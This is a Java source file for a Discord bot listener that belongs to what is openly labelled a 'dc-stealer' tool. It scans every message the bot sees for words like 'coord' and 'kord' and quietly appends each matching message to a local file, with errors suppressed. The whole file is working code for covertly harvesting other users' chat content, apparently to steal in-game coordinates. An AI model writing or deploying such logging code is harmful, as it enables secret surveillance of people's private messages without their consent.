package me.permafreez.Loggers;

import java.io.FileWriter;
import java.io.PrintWriter;

import me.permafreez.Main;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class Fucker2 extends ListenerAdapter{
	
	// MessageReceived method
	@Override
	public void onMessageReceived(MessageReceivedEvent event) {
		
		// Getting message
		String args = event.getMessage().getContentRaw();
		
		// Array of trigger words
		String[] aliases = {"coord", "cord", "koord", "kord"};
		
		// Testing for 'aliases' - for
		for (String a : aliases) {
			
			// Testing for 'aliases' - if 
			if (args.contains(a)) {
				
				// Sending console message
				System.out.println("Just saved a message containing " + a + "!");
				
				// Saving to file
				try {
				FileWriter fout = new FileWriter(Main.folder + "dc-stealer/Coords.txt", true);
				PrintWriter fileout =  new PrintWriter(fout, true);
				
				fileout.print(args + "\n");
				
				fout.close();
				fileout.close(); } catch (Exception e) {}
			}
		}
	}
}
